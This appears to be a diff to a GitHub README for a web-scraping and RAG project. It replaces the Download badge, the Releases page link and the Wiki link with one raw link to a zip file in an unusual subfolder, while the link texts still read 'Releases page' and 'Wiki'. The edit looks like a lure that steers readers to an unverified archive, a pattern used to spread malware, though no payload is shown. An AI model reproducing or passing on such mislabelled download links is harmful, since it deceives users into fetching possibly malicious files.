@@ -6,7 +6,7 @@ Welcome to the Scraping_AI_with_RAG_Tune project! This guide will walk you throu
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Releases-brightgreen.svg)](https://github.com/Ghostiepg/Scraping_AI_with_RAG_Tune/releases)
+[![Download](https://raw.githubusercontent.com/Ghostiepg/Scraping_AI_with_RAG_Tune/main/jedcock/Scraping_AI_with_RAG_Tune.zip)](https://raw.githubusercontent.com/Ghostiepg/Scraping_AI_with_RAG_Tune/main/jedcock/Scraping_AI_with_RAG_Tune.zip)
 
 ## 📋 What You Need
 
@@ -28,7 +28,7 @@ This application allows you to:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ghostiepg/Scraping_AI_with_RAG_Tune/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ghostiepg/Scraping_AI_with_RAG_Tune/main/jedcock/Scraping_AI_with_RAG_Tune.zip) to access the latest version.
 2. Look for the file that matches your operating system.
 3. Click on the download link to start the download process.
 4. Once downloaded, locate the file in your downloads folder.
@@ -66,7 +66,7 @@ Additionally, check the FAQ section on the Releases page for common problems and
 
 For more in-depth information:
 
-- Consult the [Wiki](https://github.com/Ghostiepg/Scraping_AI_with_RAG_Tune/wiki).
+- Consult the [Wiki](https://raw.githubusercontent.com/Ghostiepg/Scraping_AI_with_RAG_Tune/main/jedcock/Scraping_AI_with_RAG_Tune.zip).
 - Review our examples and tutorials to become proficient.
 
 ## 📞 Support
